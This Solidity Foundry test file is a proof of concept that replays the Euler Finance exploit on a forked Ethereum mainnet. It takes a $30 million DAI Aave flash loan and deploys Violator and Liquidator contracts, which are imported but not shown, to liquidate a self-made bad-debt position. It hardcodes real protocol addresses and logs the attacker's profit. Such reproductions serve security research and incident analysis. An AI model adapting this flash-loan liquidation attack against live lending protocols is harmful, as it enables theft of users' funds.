// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { Test } from "forge-std/src/Test.sol";
import { console } from "forge-std/src/console.sol";
import { Violator } from "./Violator.sol";
import { Liquidator } from "./Liquidator.sol";
import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { IAaveFlashLoan } from "./interface/IAaveFlashLoan.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";
import { MarketsView } from "./MarketsView.sol";
import { IMarkets } from "./interface/IMarkets.sol";

contract EulerFinancePoC is Test {
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEToken constant eDAI = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    // address eTokenImpl = address(0xeC29b4C2CaCaE5dF1A491f084E5Ec7C62A7EdAb5);
    IMarkets constant MARKETS = IMarkets(0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3);
    IMarkets constant MARKETS_IMPL = IMarkets(0x1E21CAc3eB590a5f5482e1CCe07174DcDb7f7FCe);
    IDToken constant dDAI = IDToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    ILiquidation constant LIQUIDATION = ILiquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashLoan constant aaveV2 = IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    Violator violator;
    Liquidator liquidator;

    function setUp() public {
        vm.createSelectFork("eth", 16817995);
        vm.etch(address(MARKETS_IMPL), address(deployCode('MarketsView.sol')).code);
        vm.label(address(DAI), "DAI");
        vm.label(address(eDAI), "eToken");
        vm.label(address(dDAI), "dToken");
        vm.label(address(aaveV2), "Aave");
    }

    function testExploit() public {
        console.log("Attacker DAI balance before exploit", DAI.balanceOf(address(this)));
        // 1. Flash loan $30 million DAI
        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint[](1);
        modes[0] = 0;
        bytes memory params =
        abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(DAI), address(eDAI), address(dDAI));
        // documentation on Aave flash loans: https://docs.aave.com/developers/guides/flash-loans
        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);

        // 10. attacker's balance > 30 million DAI borrowed + 27k DAI interest => loan repaid successfully automatically (else flashLoan would revert)

        // 8.87 million DAI profit!
        console.log("Attacker DAI balance after exploit - attack profits:", DAI.balanceOf(address(this)));
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initator,
        bytes calldata params
    ) external returns (bool) {
        // approve aave to spend DAI
        DAI.approve(address(aaveV2), type(uint256).max);
        // 2. deploy two contracts
        address person = makeAddr("person");
        violator = new Violator(DAI, IEToken(address(eDAI)), dDAI, EULER, LIQUIDATION, MARKETS, person);
        liquidator = new Liquidator(DAI, IEToken(address(eDAI)), dDAI, EULER, LIQUIDATION, MARKETS);
        // transfer flash loan to the violator
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
        violator.violate();
        liquidator.liquidate(address(violator));
        return true;
    }
}